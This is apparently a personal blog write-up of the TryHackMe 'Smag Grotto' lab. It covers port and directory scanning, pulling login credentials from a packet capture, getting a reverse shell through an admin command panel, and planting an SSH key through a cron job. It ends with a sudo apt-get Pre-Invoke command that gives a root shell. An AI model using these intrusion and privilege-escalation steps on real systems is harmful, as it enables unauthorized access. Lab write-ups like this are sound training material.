---
title: SmagGrotto Writeup
published: 2026-03-22
description: Writeup of an easy room by TryHackMe.
tags: [Writeup, Easy, TryHackMe]
category: TryHackMe
draft: false
---

### Hello guys today we will be doing another tryhackme room called Smag Grotto. It is a easy room.
### Lets start with a nmap scan to find open ports.
```
┌──(igris㉿kali)-[~/Desktop/SmagGrotto]
└─$ nmap -sV 10.201.25.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 23:14 EDT
Nmap scan report for 10.201.25.130
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### The website had nothing interesting so i ran a gobuster search with common wordlist.
```
┌──(igris㉿kali)-[~/Desktop/SmagGrotto]
└─$ gobuster dir -u 10.201.25.130 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.25.130
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 313] [--> http://10.201.25.130/mail/]
```
### There was a /mail directory we find some emails and a .pcap file so the room must be related to networking which im not very good at. 
### In the mails it said to download with wget idk why is that but letss see.
### Checking the .pcap file in wireshark we find a http post request for login

<img width="2718" height="326" alt="image" src="https://github.com/user-attachments/assets/14d22212-988a-464b-83f1-80599294ccc9" />

### Analyzing the request we find a username and password. We also got to know that it was used on the host development.smag.thm.
<img width="782" height="142" alt="image" src="https://github.com/user-attachments/assets/fdaa6b5b-2854-4d80-8608-30e9d7888ad9" />

### So i added development.smag.thm to /etc/hosts and tried to access it.
```
┌──(igris㉿kali)-[~/Desktop/SmagGrotto]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.201.17.4 smag.thm development.smag.thm
```

### And here we go we got the login panel and i logged in with the credentials.

### Then in the admin panel there was a place to enter commands which didnt show up. So i tried to get a reverse shell.
### And just like that i was in as www-data and looking at home we found a user jake.
### Now i found a cronjob running 
```
www-data@smag:/var/www/development.smag.thm$ less /etc/crontab
less /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

### Here i added my own generated ssh public key to /opt/.backups/jake_id_rsa.pub.backup and after a while used the private key to login as jake.
### And i was in as jake
```
┌──(igris㉿kali)-[~/Desktop/SmagGrotto]
└─$ ssh -i id_rsa jake@smag.thm 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Mon Oct  6 22:15:41 2025 from 10.9.2.156
jake@smag:~$ 
```
### Then i got the user.txt and now attempting privilege escalation.
### Looking at sudo -l we found that jake can run apt-get. 
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
### Now going to gtfobins and ran this command "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh" and we got root.
<img width="699" height="101" alt="image" src="https://github.com/user-attachments/assets/5c8c733d-6a0f-455e-b1ee-1c42b37973ef" />
### So that's it we got the root text and the room was over....
